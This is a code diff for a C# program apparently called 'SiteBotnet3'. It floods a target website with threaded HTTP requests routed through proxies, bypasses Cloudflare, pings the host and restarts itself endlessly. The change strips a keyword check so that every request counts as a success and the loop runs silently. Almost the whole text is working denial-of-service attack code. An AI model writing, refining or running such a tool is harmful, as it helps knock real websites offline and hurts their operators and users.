@@ -1,7 +1,6 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using Leaf.xNet;
-using System.IO;
 using Leaf.xNet.Services.Cloudflare;
 using System.Net.NetworkInformation;
 using System.Threading;
@@ -13,7 +12,6 @@ namespace SiteBotnet3
         private string ProxyType;
         private List<string> ProxyList;
 
-        private string Keyword;
         private string Target;
         private int Threads;
 
@@ -24,34 +22,17 @@ namespace SiteBotnet3
 
         public Requests(string Name) { ThreadName = Name; }
 
-        public void SetTarget(string Target)
-        {
-            this.Target = Target;
-        }
+        public void SetTarget(string Target) { this.Target = Target; }
 
-        public void SetKeyword(string Keyword)
-        {
-            this.Keyword = Keyword;
-        }
+        public void SetThreads(int Threads) { this.Threads = Threads; }
 
-        public void SetThreads(int Threads)
-        {
-            this.Threads = Threads;
-        }
+        public void SetProxyType(string ProxyType) { this.ProxyType = ProxyType; }
 
-        public void SetProxyType(string ProxyType)
-        {
-            this.ProxyType = ProxyType;
-        }
+        public void SetProxyList(List<string> ProxyList) { if (!ProxyType.Equals("NONE")) this.ProxyList = ProxyList; }
 
-        public void SetProxyList(List<string> ProxyList)
+        public void Start(bool showMsg)
         {
-            if (!ProxyType.Equals("NONE")) this.ProxyList = ProxyList;
-        }
-
-        public void Start()
-        {
-            Console.WriteLine(ThreadName + " IS STARTING...");
+            if (showMsg) Console.WriteLine(ThreadName + " IS STARTING...");
             Thread = new Thread(BotnetWebsite) { Name = ThreadName };
             Thread.Start();
         }
@@ -129,19 +110,11 @@ namespace SiteBotnet3
                         HttpResponse respo1 = req1.Get(Target);
                         if (respo1.IsCloudflared()) respo1 = req1.GetThroughCloudflare(Target);
 
-                        if (respo1.ToString().Contains(Keyword))
-                        {
-                            Hits += 1;
-                            Console.WriteLine(ThreadName + " (" + Hits + " Hits) SUCCESS! Keyword : " + Keyword + " | Target : " + Target + " | Threads : " + Threads);
+                        Hits += 1;
+                        Console.WriteLine(ThreadName + " (" + Hits + " Hits) SUCCESS! | Target : " + Target + " | Threads : " + Threads);
+                        new Ping().Send(new Uri(Target).Host);
 
-                            Uri uri = new Uri(Target);
-                            Ping pi = new Ping();
-                            long roundtripTime = pi.Send(uri.Host).RoundtripTime;
-                            Console.WriteLine(ThreadName + " Pinged website : " + roundtripTime + "ms");
-                        }
-                        else Console.WriteLine(ThreadName + " FAILED! Keyword : " + Keyword + " | Target : " + Target + " | Threads : " + Threads);
-
-                        Start();
+                        Start(false);
                     }
                 }
             }
